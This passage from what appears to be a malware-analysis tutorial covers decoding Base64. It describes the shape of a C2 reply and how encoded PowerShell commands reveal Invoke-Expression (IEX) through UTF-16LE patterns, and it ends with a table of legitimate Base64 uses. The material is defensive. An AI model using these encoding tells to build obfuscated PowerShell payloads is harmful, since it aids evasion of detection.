  • Result: "no command, call back in 600 seconds" — the shape of a C2 reply

CyberChef's "From Base64" is handy, especially for peeling layered encodings (Base64 inside gzip inside Base64). If the result is an executable, don't run it — hash it and look it up, or analyse it in an isolated environment.

[Added] PowerShell encoded commands are UTF-16LE. Base64 passed to PowerShell's -EncodedCommand (-enc) encodes UTF-16LE text (two bytes per character), so decoding yields 00 bytes between characters (I.E.X.). Convert with UTF-16LE ([Text.Encoding]::Unicode), not UTF-8, to read it. The tell is an A in every other position, as in SQBFAFgA (= IEX) or JABzAD0A (= $s=).

docs.title: Legitimate uses
docs.text:
Where Example Note Email attachments (MIME) Content-Transfer-Encoding: base64 The original purpose Auth tokens (JWT) Authorization: Bearer eyJhbGciOi... Three dot-separated parts; the first two are readable by anyone HTTP Basic auth Authorization: Basic YWRtaW46... Decodes to user:password verbatim — not encryption Images in pages src="data:image/png;base64,iVBORw0KGgo..." Small images embedded directly ASP.NET form state __VIEWSTATE=/wEPDwUK...
